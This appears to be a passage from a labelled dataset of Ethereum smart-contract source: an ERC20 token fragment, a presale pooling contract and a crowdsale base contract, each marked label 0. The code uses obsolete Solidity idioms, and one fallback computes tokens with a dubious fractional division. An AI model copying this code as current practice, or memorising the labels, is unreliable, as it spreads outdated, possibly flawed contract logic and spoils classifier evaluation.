  return balances[_owner];\r\r\n    }\r\r\n\r\r\n\r\r\n    function transferFrom(\r\r\n         address _from,\r\r\n         address _to,\r\r\n         uint256 _amount\r\r\n     ) public returns (bool success) {\r\r\n         if (balances[_from] >= _amount\r\r\n             && allowed[_from][msg.sender] >= _amount\r\r\n             && _amount > 0\r\r\n             && balances[_to] + _amount > balances[_to]) {\r\r\n             balances[_from] -= _amount;\r\r\n             allowed[_from][msg.sender] -= _amount;\r\r\n             balances[_to] += _amount;\r\r\n             return true;\r\r\n         } else {\r\r\n             return false;\r\r\n         }\r\r\n  }\r\r\n\r\r\n    function approve(address _spender, uint256 _amount) public returns (bool success) {\r\r\n         allowed[msg.sender][_spender] = _amount;\r\r\n         Approval(msg.sender, _spender, _amount);\r\r\n         \r\r\n         return true;\r\r\n     }\r\r\n\/\/ Crowdfunding:\r\r\n\r\r\n    \/\/\/ @notice Create tokens when funding is active.\r\r\n    \/\/\/ @dev Required state: Funding Active\r\r\n    \/\/\/ @dev State transition: -> Funding Success (only if cap reached)\r\r\n    function () payable external {\r\r\n        \/\/ Abort if not in Funding Active state.\r\r\n        \/\/ The checks are split (instead of using or operator) because it is\r\r\n        \/\/ cheaper this way.\r\r\n        if (!funding) revert();\r\r\n        \r\r\n        \/\/ Do not allow creating 0 or more than the cap tokens.\r\r\n        if (msg.value == 0) revert();\r\r\n        \r\r\n        var numTokens = msg.value * (1000.0\/totalTokens);\r\r\n        totalTokens += numTokens;\r\r\n\r\r\n        \/\/ Assign new tokens to the sender\r\r\n        balances[msg.sender] += numTokens;\r\r\n\r\r\n        \/\/ Log token creation event\r\r\n        Transfer(0, msg.sender, numTokens);\r\r\n    }\r\r\n}","label":0}
{"code":"\/\/ Author : shift\r\r\n\r\r\npragma solidity ^0.4.18;\r\r\n\r\r\n\/\/--------- OpenZeppelin&#39;s Safe Math\r\r\n\/\/Source : https:\/\/github.com\/OpenZeppelin\/zeppelin-solidity\/blob\/master\/contracts\/math\/SafeMath.sol\r\r\n\/**\r\r\n * @title SafeMath\r\r\n * @dev Math operations with safety checks that throw on error\r\r\n *\/\r\r\nlibrary SafeMath {\r\r\n  function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\r\n    if (a == 0) {\r\r\n      return 0;\r\r\n    }\r\r\n    uint256 c = a * b;\r\r\n    assert(c \/ a == b);\r\r\n    return c;\r\r\n  }\r\r\n\r\r\n  function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\r\n    uint256 c = a \/ b;\r\r\n    return c;\r\r\n  }\r\r\n\r\r\n  function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\r\n    assert(b <= a);\r\r\n    return a - b;\r\r\n  }\r\r\n\r\r\n  function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\r\n    uint256 c = a + b;\r\r\n    assert(c >= a);\r\r\n    return c;\r\r\n  }\r\r\n}\r\r\n\/\/-----------------------------------------------------\r\r\n\r\r\n\/\/ ERC20 Interface: https:\/\/github.com\/ethereum\/EIPs\/issues\/20\r\r\ncontract ERC20 {\r\r\n  function transfer(address _to, uint256 _value) public returns (bool success);\r\r\n  function balanceOf(address _owner) public constant returns (uint256 balance);\r\r\n}\r\r\n\r\r\n\/*\r\r\n  This contract stores twice every key value in order to be able to redistribute funds\r\r\n  when the bonus tokens are received (which is typically X months after the initial buy).\r\r\n*\/\r\r\n\r\r\ncontract Moongang {\r\r\n  using SafeMath for uint256;\r\r\n  modifier onlyOwner {\r\r\n    require(msg.sender == owner);\r\r\n    _;\r\r\n  }\r\r\n\r\r\n  modifier minAmountReached {\r\r\n    \/\/In reality, the correct amount is the amount + 1%\r\r\n    require(this.balance >= SafeMath.div(SafeMath.mul(min_amount, 100), 99));\r\r\n    _;\r\r\n  }\r\r\n\r\r\n  modifier underMaxAmount {\r\r\n    require(max_amount == 0 || this.balance <= max_amount);\r\r\n    _;\r\r\n  }\r\r\n\r\r\n  \/\/Constants of the contract\r\r\n  uint256 constant FEE = 100;    \/\/1% fee\r\r\n  \/\/SafeMath.div(20, 3) = 6\r\r\n  uint256 constant FEE_DEV = 6; \/\/15% on the 1% fee\r\r\n  uint256 constant FEE_AUDIT = 12; \/\/7.5% on the 1% fee\r\r\n  address public owner;\r\r\n  address constant public developer = 0xEE06BdDafFA56a303718DE53A5bc347EfbE4C68f;\r\r\n  address constant public auditor = 0x63F7547Ac277ea0B52A0B060Be6af8C5904953aa;\r\r\n  uint256 public individual_cap;\r\r\n\r\r\n  \/\/Variables subject to changes\r\r\n  uint256 public max_amount;  \/\/0 means there is no limit\r\r\n  uint256 public min_amount;\r\r\n\r\r\n  \/\/Store the amount of ETH deposited by each account.\r\r\n  mapping (address => uint256) public balances;\r\r\n  mapping (address => uint256) public balances_bonus;\r\r\n  \/\/ Track whether the contract has bought the tokens yet.\r\r\n  bool public bought_tokens;\r\r\n  \/\/ Record ETH value of tokens currently held by contract.\r\r\n  uint256 public contract_eth_value;\r\r\n  uint256 public contract_eth_value_bonus;\r\r\n  \/\/Set by the owner in order to allow the withdrawal of bonus tokens.\r\r\n  bool public bonus_received;\r\r\n  \/\/The address of the contact.\r\r\n  address public sale;\r\r\n  \/\/Token address\r\r\n  ERC20 public token;\r\r\n  \/\/Records the fees that have to be sent\r\r\n  uint256 fees;\r\r\n  \/\/Set by the owner. Allows people to refund totally or partially.\r\r\n  bool public allow_refunds;\r\r\n  \/\/The reduction of the allocation in % | example : 40 -> 40% reduction\r\r\n  uint256 public percent_reduction;\r\r\n  bool public owner_supplied_eth;\r\r\n  bool public allow_contributions;\r\r\n\r\r\n  \/\/Internal functions\r\r\n  function Moongang(uint256 max, uint256 min, uint256 cap) {\r\r\n    \/*\r\r\n    Constructor\r\r\n    *\/\r\r\n    owner = msg.sender;\r\r\n    max_amount = SafeMath.div(SafeMath.mul(max, 100), 99);\r\r\n    min_amount = min;\r\r\n    individual_cap = cap;\r\r\n    allow_contributions = true;\r\r\n  }\r\r\n\r\r\n  \/\/Functions for the owner\r\r\n\r\r\n  \/\/ Buy the tokens. Sends ETH to the presale wallet and records the ETH amount held in the contract.\r\r\n  function buy_the_tokens() onlyOwner minAmountReached underMaxAmount {\r\r\n    \/\/Avoids burning the funds\r\r\n    require(!bought_tokens && sale != 0x0);\r\r\n    \/\/Record that the contract has bought the tokens.\r\r\n    bought_tokens = true;\r\r\n    \/\/Sends the fee before so the contract_eth_value contains the correct balance\r\r\n    uint256 dev_fee = SafeMath.div(fees, FEE_DEV);\r\r\n    uint256 audit_fee = SafeMath.div(fees, FEE_AUDIT);\r\r\n    owner.transfer(SafeMath.sub(SafeMath.sub(fees, dev_fee), audit_fee));\r\r\n    developer.transfer(dev_fee);\r\r\n    auditor.transfer(audit_fee);\r\r\n    \/\/Record the amount of ETH sent as the contract&#39;s current value.\r\r\n    contract_eth_value = this.balance;\r\r\n    contract_eth_value_bonus = this.balance;\r\r\n    \/\/ Transfer all the funds to the crowdsale address.\r\r\n    sale.transfer(contract_eth_value);\r\r\n  }\r\r\n\r\r\n  function force_refund(address _to_refund) onlyOwner {\r\r\n    require(!bought_tokens);\r\r\n    uint256 eth_to_withdraw = SafeMath.div(SafeMath.mul(balances[_to_refund], 100), 99);\r\r\n    balances[_to_refund] = 0;\r\r\n    balances_bonus[_to_refund] = 0;\r\r\n    fees = SafeMath.sub(fees, SafeMath.div(eth_to_withdraw, FEE));\r\r\n    _to_refund.transfer(eth_to_withdraw);\r\r\n  }\r\r\n\r\r\n  function force_partial_refund(address _to_refund) onlyOwner {\r\r\n    require(bought_tokens && percent_reduction > 0);\r\r\n    \/\/Amount to refund is the amount minus the X% of the reduction\r\r\n    \/\/amount_to_refund = balance*X\r\r\n    uint256 amount = SafeMath.div(SafeMath.mul(balances[_to_refund], percent_reduction), 100);\r\r\n    balances[_to_refund] = SafeMath.sub(balances[_to_refund], amount);\r\r\n    balances_bonus[_to_refund] = balances[_to_refund];\r\r\n    if (owner_supplied_eth) {\r\r\n      \/\/dev fees aren&#39;t refunded, only owner fees\r\r\n      uint256 fee = amount.div(FEE).mul(percent_reduction).div(100);\r\r\n      amount = amount.add(fee);\r\r\n    }\r\r\n    _to_refund.transfer(amount);\r\r\n  }\r\r\n\r\r\n  function set_sale_address(address _sale) onlyOwner {\r\r\n    \/\/Avoid mistake of putting 0x0 and can&#39;t change twice the sale address\r\r\n    require(_sale != 0x0);\r\r\n    sale = _sale;\r\r\n  }\r\r\n\r\r\n  function set_token_address(address _token) onlyOwner {\r\r\n    require(_token != 0x0);\r\r\n    token = ERC20(_token);\r\r\n  }\r\r\n\r\r\n  function set_bonus_received(bool _boolean) onlyOwner {\r\r\n    bonus_received = _boolean;\r\r\n  }\r\r\n\r\r\n  function set_allow_refunds(bool _boolean) onlyOwner {\r\r\n    \/*\r\r\n    In case, for some reasons, the project refunds the money\r\r\n    *\/\r\r\n    allow_refunds = _boolean;\r\r\n  }\r\r\n\r\r\n  function set_allow_contributions(bool _boolean) onlyOwner {\r\r\n      allow_contributions = _boolean;\r\r\n  }\r\r\n\r\r\n  function set_percent_reduction(uint256 _reduction) onlyOwner payable {\r\r\n    require(bought_tokens && _reduction <= 100);\r\r\n    percent_reduction = _reduction;\r\r\n    if (msg.value > 0) {\r\r\n      owner_supplied_eth = true;\r\r\n    }\r\r\n    \/\/we substract by contract_eth_value*_reduction basically\r\r\n    contract_eth_value = contract_eth_value.sub((contract_eth_value.mul(_reduction)).div(100));\r\r\n    contract_eth_value_bonus = contract_eth_value;\r\r\n  }\r\r\n\r\r\n  function change_individual_cap(uint256 _cap) onlyOwner {\r\r\n    individual_cap = _cap;\r\r\n  }\r\r\n\r\r\n  function change_owner(address new_owner) onlyOwner {\r\r\n    require(new_owner != 0x0);\r\r\n    owner = new_owner;\r\r\n  }\r\r\n\r\r\n  function change_max_amount(uint256 _amount) onlyOwner {\r\r\n      \/\/ATTENTION! The new amount should be in wei\r\r\n      \/\/Use https:\/\/etherconverter.online\/\r\r\n      max_amount = SafeMath.div(SafeMath.mul(_amount, 100), 99);\r\r\n  }\r\r\n\r\r\n  function change_min_amount(uint256 _amount) onlyOwner {\r\r\n      \/\/ATTENTION! The new amount should be in wei\r\r\n      \/\/Use https:\/\/etherconverter.online\/\r\r\n      min_amount = _amount;\r\r\n  }\r\r\n\r\r\n  \/\/Public functions\r\r\n\r\r\n  \/\/ Allows any user to withdraw his tokens.\r\r\n  function withdraw() {\r\r\n    \/\/ Disallow withdraw if tokens haven&#39;t been bought yet.\r\r\n    require(bought_tokens);\r\r\n    uint256 contract_token_balance = token.balanceOf(address(this));\r\r\n    \/\/ Disallow token withdrawals if there are no tokens to withdraw.\r\r\n    require(contract_token_balance != 0);\r\r\n    uint256 tokens_to_withdraw = SafeMath.div(SafeMath.mul(balances[msg.sender], contract_token_balance), contract_eth_value);\r\r\n    \/\/ Update the value of tokens currently held by the contract.\r\r\n    contract_eth_value = SafeMath.sub(contract_eth_value, balances[msg.sender]);\r\r\n    \/\/ Update the user&#39;s balance prior to sending to prevent recursive call.\r\r\n    balances[msg.sender] = 0;\r\r\n    \/\/ Send the funds.  Throws on failure to prevent loss of funds.\r\r\n    require(token.transfer(msg.sender, tokens_to_withdraw));\r\r\n  }\r\r\n\r\r\n  function withdraw_bonus() {\r\r\n  \/*\r\r\n    Special function to withdraw the bonus tokens after the 6 months lockup.\r\r\n    bonus_received has to be set to true.\r\r\n  *\/\r\r\n    require(bought_tokens && bonus_received);\r\r\n    uint256 contract_token_balance = token.balanceOf(address(this));\r\r\n    require(contract_token_balance != 0);\r\r\n    uint256 tokens_to_withdraw = SafeMath.div(SafeMath.mul(balances_bonus[msg.sender], contract_token_balance), contract_eth_value_bonus);\r\r\n    contract_eth_value_bonus = SafeMath.sub(contract_eth_value_bonus, balances_bonus[msg.sender]);\r\r\n    balances_bonus[msg.sender] = 0;\r\r\n    require(token.transfer(msg.sender, tokens_to_withdraw));\r\r\n  }\r\r\n\r\r\n  \/\/ Allows any user to get his eth refunded before the purchase is made.\r\r\n  function refund() {\r\r\n    require(!bought_tokens && allow_refunds && percent_reduction == 0);\r\r\n    \/\/balance of contributor = contribution * 0.99\r\r\n    \/\/so contribution = balance\/0.99\r\r\n    uint256 eth_to_withdraw = SafeMath.div(SafeMath.mul(balances[msg.sender], 100), 99);\r\r\n    \/\/ Update the user&#39;s balance prior to sending ETH to prevent recursive call.\r\r\n    balances[msg.sender] = 0;\r\r\n    \/\/Updates the balances_bonus too\r\r\n    balances_bonus[msg.sender] = 0;\r\r\n    \/\/Updates the fees variable by substracting the refunded fee\r\r\n    fees = SafeMath.sub(fees, SafeMath.div(eth_to_withdraw, FEE));\r\r\n    \/\/ Return the user&#39;s funds.  Throws on failure to prevent loss of funds.\r\r\n    msg.sender.transfer(eth_to_withdraw);\r\r\n  }\r\r\n\r\r\n  \/\/Allows any user to get a part of his ETH refunded, in proportion\r\r\n  \/\/to the % reduced of the allocation\r\r\n  function partial_refund() {\r\r\n    require(bought_tokens && percent_reduction > 0);\r\r\n    \/\/Amount to refund is the amount minus the X% of the reduction\r\r\n    \/\/amount_to_refund = balance*X\r\r\n    uint256 amount = SafeMath.div(SafeMath.mul(balances[msg.sender], percent_reduction), 100);\r\r\n    balances[msg.sender] = SafeMath.sub(balances[msg.sender], amount);\r\r\n    balances_bonus[msg.sender] = balances[msg.sender];\r\r\n    if (owner_supplied_eth) {\r\r\n      \/\/dev fees aren&#39;t refunded, only owner fees\r\r\n      uint256 fee = amount.div(FEE).mul(percent_reduction).div(100);\r\r\n      amount = amount.add(fee);\r\r\n    }\r\r\n    msg.sender.transfer(amount);\r\r\n  }\r\r\n\r\r\n  \/\/ Default function.  Called when a user sends ETH to the contract.\r\r\n  function () payable underMaxAmount {\r\r\n    require(!bought_tokens && allow_contributions);\r\r\n    \/\/1% fee is taken on the ETH\r\r\n    uint256 fee = SafeMath.div(msg.value, FEE);\r\r\n    fees = SafeMath.add(fees, fee);\r\r\n    \/\/Updates both of the balances\r\r\n    balances[msg.sender] = SafeMath.add(balances[msg.sender], SafeMath.sub(msg.value, fee));\r\r\n    \/\/Checks if the individual cap is respected\r\r\n    \/\/If it&#39;s not, changes are reverted\r\r\n    require(individual_cap == 0 || balances[msg.sender] <= individual_cap);\r\r\n    balances_bonus[msg.sender] = balances[msg.sender];\r\r\n  }\r\r\n}","label":0}
{"code":"\/**\r\r\n * Safe unsigned safe math.\r\r\n *\r\r\n * https:\/\/blog.aragon.one\/library-driven-development-in-solidity-2bebcaf88736#.750gwtwli\r\r\n *\r\r\n * Originally from https:\/\/raw.githubusercontent.com\/AragonOne\/zeppelin-solidity\/master\/contracts\/SafeMathLib.sol\r\r\n *\r\r\n * Maintained here until merged to mainline zeppelin-solidity.\r\r\n *\r\r\n *\/\r\r\nlibrary SafeMathLib {\r\r\n\r\r\n  function times(uint a, uint b) returns (uint) {\r\r\n    uint c = a * b;\r\r\n    assert(a == 0 || c \/ a == b);\r\r\n    return c;\r\r\n  }\r\r\n\r\r\n  function minus(uint a, uint b) returns (uint) {\r\r\n    assert(b <= a);\r\r\n    return a - b;\r\r\n  }\r\r\n\r\r\n  function plus(uint a, uint b) returns (uint) {\r\r\n    uint c = a + b;\r\r\n    assert(c>=a);\r\r\n    return c;\r\r\n  }\r\r\n\r\r\n  function assert(bool assertion) private {\r\r\n    if (!assertion) throw;\r\r\n  }\r\r\n}\r\r\n\r\r\n\r\r\n\r\r\n\r\r\n\/*\r\r\n * Ownable\r\r\n *\r\r\n * Base contract with an owner.\r\r\n * Provides onlyOwner modifier, which prevents function from running if it is called by anyone other than the owner.\r\r\n *\/\r\r\ncontract Ownable {\r\r\n  address public owner;\r\r\n\r\r\n  function Ownable() {\r\r\n    owner = msg.sender;\r\r\n  }\r\r\n\r\r\n  modifier onlyOwner() {\r\r\n    if (msg.sender != owner) {\r\r\n      throw;\r\r\n    }\r\r\n    _;\r\r\n  }\r\r\n\r\r\n  function transferOwnership(address newOwner) onlyOwner {\r\r\n    if (newOwner != address(0)) {\r\r\n      owner = newOwner;\r\r\n    }\r\r\n  }\r\r\n\r\r\n}\r\r\n\r\r\n\r\r\n\/*\r\r\n * Haltable\r\r\n *\r\r\n * Abstract contract that allows children to implement an\r\r\n * emergency stop mechanism. Differs from Pausable by causing a throw when in halt mode.\r\r\n *\r\r\n *\r\r\n * Originally envisioned in FirstBlood ICO contract.\r\r\n *\/\r\r\ncontract Haltable is Ownable {\r\r\n  bool public halted;\r\r\n\r\r\n  modifier stopInEmergency {\r\r\n    if (halted) throw;\r\r\n    _;\r\r\n  }\r\r\n\r\r\n  modifier onlyInEmergency {\r\r\n    if (!halted) throw;\r\r\n    _;\r\r\n  }\r\r\n\r\r\n  \/\/ called by the owner on emergency, triggers stopped state\r\r\n  function halt() external onlyOwner {\r\r\n    halted = true;\r\r\n  }\r\r\n\r\r\n  \/\/ called by the owner on end of emergency, returns to normal state\r\r\n  function unhalt() external onlyOwner onlyInEmergency {\r\r\n    halted = false;\r\r\n  }\r\r\n\r\r\n}\r\r\n\r\r\n\r\r\n\/**\r\r\n * Interface for defining crowdsale pricing.\r\r\n *\/\r\r\ncontract PricingStrategy {\r\r\n\r\r\n  \/** Interface declaration. *\/\r\r\n  function isPricingStrategy() public constant returns (bool) {\r\r\n    return true;\r\r\n  }\r\r\n\r\r\n  \/** Self check if all references are correctly set.\r\r\n   *\r\r\n   * Checks that pricing strategy matches crowdsale parameters.\r\r\n   *\/\r\r\n  function isSane(address crowdsale) public constant returns (bool) {\r\r\n    return true;\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * When somebody tries to buy tokens for X eth, calculate how many tokens they get.\r\r\n   *\r\r\n   *\r\r\n   * @param value - What is the value of the transaction send in as wei\r\r\n   * @param tokensSold - how much tokens have been sold this far\r\r\n   * @param weiRaised - how much money has been raised this far\r\r\n   * @param msgSender - who is the investor of this transaction\r\r\n   * @param decimals - how many decimal units the token has\r\r\n   * @return Amount of tokens the investor receives\r\r\n   *\/\r\r\n  function calculatePrice(uint value, uint weiRaised, uint tokensSold, address msgSender, uint decimals) public constant returns (uint tokenAmount);\r\r\n}\r\r\n\r\r\n\r\r\n\/**\r\r\n * Finalize agent defines what happens at the end of succeseful crowdsale.\r\r\n *\r\r\n * - Allocate tokens for founders, bounties and community\r\r\n * - Make tokens transferable\r\r\n * - etc.\r\r\n *\/\r\r\ncontract FinalizeAgent {\r\r\n\r\r\n  function isFinalizeAgent() public constant returns(bool) {\r\r\n    return true;\r\r\n  }\r\r\n\r\r\n  \/** Return true if we can run finalizeCrowdsale() properly.\r\r\n   *\r\r\n   * This is a safety check function that doesn&#39;t allow crowdsale to begin\r\r\n   * unless the finalizer has been set up properly.\r\r\n   *\/\r\r\n  function isSane() public constant returns (bool);\r\r\n\r\r\n  \/** Called once by crowdsale finalize() if the sale was success. *\/\r\r\n  function finalizeCrowdsale();\r\r\n\r\r\n}\r\r\n\r\r\n\r\r\n\r\r\n\r\r\n\/*\r\r\n * ERC20 interface\r\r\n * see https:\/\/github.com\/ethereum\/EIPs\/issues\/20\r\r\n *\/\r\r\ncontract ERC20 {\r\r\n  uint public totalSupply;\r\r\n  function balanceOf(address who) constant returns (uint);\r\r\n  function allowance(address owner, address spender) constant returns (uint);\r\r\n\r\r\n  function transfer(address to, uint value) returns (bool ok);\r\r\n  function transferFrom(address from, address to, uint value) returns (bool ok);\r\r\n  function approve(address spender, uint value) returns (bool ok);\r\r\n  event Transfer(address indexed from, address indexed to, uint value);\r\r\n  event Approval(address indexed owner, address indexed spender, uint value);\r\r\n}\r\r\n\r\r\n\r\r\n\/**\r\r\n * A token that defines fractional units as decimals.\r\r\n *\/\r\r\ncontract FractionalERC20 is ERC20 {\r\r\n\r\r\n  uint public decimals;\r\r\n\r\r\n}\r\r\n\r\r\n\r\r\n\r\r\n\/**\r\r\n * Abstract base contract for token sales.\r\r\n *\r\r\n * Handle\r\r\n * - start and end dates\r\r\n * - accepting investments\r\r\n * - minimum funding goal and refund\r\r\n * - various statistics during the crowdfund\r\r\n * - different pricing strategies\r\r\n * - different investment policies (require server side customer id, allow only whitelisted addresses)\r\r\n *\r\r\n *\/\r\r\ncontract Crowdsale is Haltable {\r\r\n\r\r\n  \/* Max investment count when we are still allowed to change the multisig address *\/\r\r\n  uint public MAX_INVESTMENTS_BEFORE_MULTISIG_CHANGE = 5;\r\r\n\r\r\n  using SafeMathLib for uint;\r\r\n\r\r\n  \/* The token we are selling *\/\r\r\n  FractionalERC20 public token;\r\r\n\r\r\n  \/* How we are going to price our offering *\/\r\r\n  PricingStrategy public pricingStrategy;\r\r\n\r\r\n  \/* Post-success callback *\/\r\r\n  FinalizeAgent public finalizeAgent;\r\r\n\r\r\n  \/* tokens will be transfered from this address *\/\r\r\n  address public multisigWallet;\r\r\n\r\r\n  \/* if the funding goal is not reached, investors may withdraw their funds *\/\r\r\n  uint public minimumFundingGoal;\r\r\n\r\r\n  \/* the UNIX timestamp start date of the crowdsale *\/\r\r\n  uint public startsAt;\r\r\n\r\r\n  \/* the UNIX timestamp end date of the crowdsale *\/\r\r\n  uint public endsAt;\r\r\n\r\r\n  \/* the number of tokens already sold through this contract*\/\r\r\n  uint public tokensSold = 0;\r\r\n\r\r\n  \/* How many wei of funding we have raised *\/\r\r\n  uint public weiRaised = 0;\r\r\n\r\r\n  \/* How many distinct addresses have invested *\/\r\r\n  uint public investorCount = 0;\r\r\n\r\r\n  \/* How much wei we have returned back to the contract after a failed crowdfund. *\/\r\r\n  uint public loadedRefund = 0;\r\r\n\r\r\n  \/* How much wei we have given back to investors.*\/\r\r\n  uint public weiRefunded = 0;\r\r\n\r\r\n  \/* Has this crowdsale been finalized *\/\r\r\n  bool public finalized;\r\r\n\r\r\n  \/* Do we need to have unique contributor id for each customer *\/\r\r\n  bool public requireCustomerId;\r\r\n\r\r\n  \/**\r\r\n    * Do we verify that contributor has been cleared on the server side (accredited investors only).\r\r\n    * This method was first used in FirstBlood crowdsale to ensure all contributors have accepted terms on sale (on the web).\r\r\n    *\/\r\r\n  bool public requiredSignedAddress;\r\r\n\r\r\n  \/* Server side address that signed allowed contributors (Ethereum addresses) that can participate the crowdsale *\/\r\r\n  address public signerAddress;\r\r\n\r\r\n  \/** How much ETH each address has invested to this crowdsale *\/\r\r\n  mapping (address => uint256) public investedAmountOf;\r\r\n\r\r\n  \/** How much tokens this crowdsale has credited for each investor address *\/\r\r\n  mapping (address => uint256) public tokenAmountOf;\r\r\n\r\r\n  \/** Addresses that are allowed to invest even before ICO offical opens. For testing, for ICO partners, etc. *\/\r\r\n  mapping (address => bool) public earlyParticipantWhitelist;\r\r\n\r\r\n  \/** This is for manul testing for the interaction from owner wallet. You can set it to any value and inspect this in blockchain explorer to see that crowdsale interaction works. *\/\r\r\n  uint public ownerTestValue;\r\r\n\r\r\n  \/** State machine\r\r\n   *\r\r\n   * - Preparing: All contract initialization calls and variables have not been set yet\r\r\n   * - Prefunding: We have not passed start time yet\r\r\n   * - Funding: Active crowdsale\r\r\n   * - Success: Minimum funding goal reached\r\r\n   * - Failure: Minimum funding goal not reached before ending time\r\r\n   * - Finalized: The finalized has been called and succesfully executed\r\r\n   * - Refunding: Refunds are loaded on the contract for reclaim.\r\r\n   *\/\r\r\n  enum State{Unknown, Preparing, PreFunding, Funding, Success, Failure, Finalized, Refunding}\r\r\n\r\r\n  \/\/ A new investment was made\r\r\n  event Invested(address investor, uint weiAmount, uint tokenAmount, uint128 customerId);\r\r\n\r\r\n  \/\/ Refund was processed for a contributor\r\r\n  event Refund(address investor, uint weiAmount);\r\r\n\r\r\n  \/\/ The rules were changed what kind of investments we accept\r\r\n  event InvestmentPolicyChanged(bool requireCustomerId, bool requiredSignedAddress, address signerAddress);\r\r\n\r\r\n  \/\/ Address early participation whitelist status changed\r\r\n  event Whitelisted(address addr, bool status);\r\r\n\r\r\n  \/\/ Crowdsale end time has been changed\r\r\n  event EndsAtChanged(uint endsAt);\r\r\n\r\r\n  function Crowdsale(address _token, PricingStrategy _pricingStrategy, address _multisigWallet, uint _start, uint _end, uint _minimumFundingGoal) {\r\r\n\r\r\n    owner = msg.sender;\r\r\n\r\r\n    token = FractionalERC20(_token);\r\r\n\r\r\n    setPricingStrategy(_pricingStrategy);\r\r\n\r\r\n    multisigWallet = _multisigWallet;\r\r\n    if(multisigWallet == 0) {\r\r\n        throw;\r\r\n    }\r\r\n\r\r\n    if(_start == 0) {\r\r\n        throw;\r\r\n    }\r\r\n\r\r\n    startsAt = _start;\r\r\n\r\r\n    if(_end == 0) {\r\r\n        throw;\r\r\n    }\r\r\n\r\r\n    endsAt = _end;\r\r\n\r\r\n    \/\/ Don&#39;t mess the dates\r\r\n    if(startsAt >= endsAt) {\r\r\n        throw;\r\r\n    }\r\r\n\r\r\n    \/\/ Minimum funding goal can be zero\r\r\n    minimumFundingGoal = _minimumFundingGoal;\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * Don&#39;t expect to just send in money and get tokens.\r\r\n   *\/\r\r\n  function() payable {\r\r\n    throw;\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * Make an investment.\r\r\n   *\r\r\n   * Crowdsale must be running for one to invest.\r\r\n   * We must have not pressed the emergency brake.\r\r\n   *\r\r\n   * @param receiver The Ethereum address who receives the tokens\r\r\n   * @param customerId (optional) UUID v4 to track the successful payments on the server side\r\r\n   *\r\r\n   *\/\r\r\n  function investInternal(address receiver, uint128 customerId) stopInEmergency private {\r\r\n\r\r\n    \/\/ Determine if it&#39;s a good time to accept investment from this participant\r\r\n    if(getState() == State.PreFunding) {\r\r\n      \/\/ Are we whitelisted for early deposit\r\r\n      if(!earlyParticipantWhitelist[receiver]) {\r\r\n        throw;\r\r\n      }\r\r\n    } else if(getState() == State.Funding) {\r\r\n      \/\/ Retail participants can only come in when the crowdsale is running\r\r\n      \/\/ pass\r\r\n    } else {\r\r\n      \/\/ Unwanted state\r\r\n      throw;\r\r\n    }\r\r\n\r\r\n    uint weiAmount = msg.value;\r\r\n    uint tokenAmount = pricingStrategy.calculatePrice(weiAmount, weiRaised, tokensSold, msg.sender, token.decimals());\r\r\n\r\r\n    if(tokenAmount == 0) {\r\r\n      \/\/ Dust transaction\r\r\n      throw;\r\r\n    }\r\r\n\r\r\n    if(investedAmountOf[receiver] == 0) {\r\r\n       \/\/ A new investor\r\r\n       investorCount++;\r\r\n    }\r\r\n\r\r\n    \/\/ Update investor\r\r\n    investedAmountOf[receiver] = investedAmountOf[receiver].plus(weiAmount);\r\r\n    tokenAmountOf[receiver] = tokenAmountOf[receiver].plus(tokenAmount);\r\r\n\r\r\n    \/\/ Update totals\r\r\n    weiRaised = weiRaised.plus(weiAmount);\r\r\n    tokensSold = tokensSold.plus(tokenAmount);\r\r\n\r\r\n    \/\/ Check that we did not bust the cap\r\r\n    if(isBreakingCap(weiAmount, tokenAmount, weiRaised, tokensSold)) {\r\r\n      throw;\r\r\n    }\r\r\n\r\r\n    assignTokens(receiver, tokenAmount);\r\r\n\r\r\n    \/\/ Pocket the money\r\r\n    if(!multisigWallet.send(weiAmount)) throw;\r\r\n\r\r\n    \/\/ Tell us invest was success\r\r\n    Invested(receiver, weiAmount, tokenAmount, customerId);\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * Preallocate tokens for the early investors.\r\r\n   *\r\r\n   * Preallocated tokens have been sold before the actual crowdsale opens.\r\r\n   * This function mints the tokens and moves the crowdsale needle.\r\r\n   *\r\r\n   * Investor count is not handled; it is assumed this goes for multiple investors\r\r\n   * and the token distribution happens outside the smart contract flow.\r\r\n   *\r\r\n   * No money is exchanged, as the crowdsale team already have received the payment.\r\r\n   *\r\r\n   * @param fullTokens tokens as full tokens - decimal places added internally\r\r\n   * @param weiPrice Price of a single full token in wei\r\r\n   *\r\r\n   *\/\r\r\n  function preallocate(address receiver, uint fullTokens, uint weiPrice) public onlyOwner {\r\r\n\r\r\n    uint tokenAmount = fullTokens * 10**token.decimals();\r\r\n    uint weiAmount = weiPrice * fullTokens; \/\/ This can be also 0, we give out tokens for free\r\r\n\r\r\n    weiRaised = weiRaised.plus(weiAmount);\r\r\n    tokensSold = tokensSold.plus(tokenAmount);\r\r\n\r\r\n    investedAmountOf[receiver] = investedAmountOf[receiver].plus(weiAmount);\r\r\n    tokenAmountOf[receiver] = tokenAmountOf[receiver].plus(tokenAmount);\r\r\n\r\r\n    assignTokens(receiver, tokenAmount);\r\r\n\r\r\n    \/\/ Tell us invest was success\r\r\n    Invested(receiver, weiAmount, tokenAmount, 0);\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * Allow anonymous contributions to this crowdsale.\r\r\n   *\/\r\r\n  function investWithSignedAddress(address addr, uint128 customerId, uint8 v, bytes32 r, bytes32 s) public payable {\r\r\n     bytes32 hash = sha256(addr);\r\r\n     if (ecrecover(hash, v, r, s) != signerAddress) throw;\r\r\n     if(customerId == 0) throw;  \/\/ UUIDv4 sanity check\r\r\n     investInternal(addr, customerId);\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * Track who is the customer making the payment so we can send thank you email.\r\r\n   *\/\r\r\n  function investWithCustomerId(address addr, uint128 customerId) public payable {\r\r\n    if(requiredSignedAddress) throw; \/\/ Crowdsale allows only server-side signed participants\r\r\n    if(customerId == 0) throw;  \/\/ UUIDv4 sanity check\r\r\n    investInternal(addr, customerId);\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * Allow anonymous contributions to this crowdsale.\r\r\n   *\/\r\r\n  function invest(address addr) public payable {\r\r\n    if(requireCustomerId) throw; \/\/ Crowdsale needs to track partipants for thank you email\r\r\n    if(requiredSignedAddress) throw; \/\/ Crowdsale allows only server-side signed participants\r\r\n    investInternal(addr, 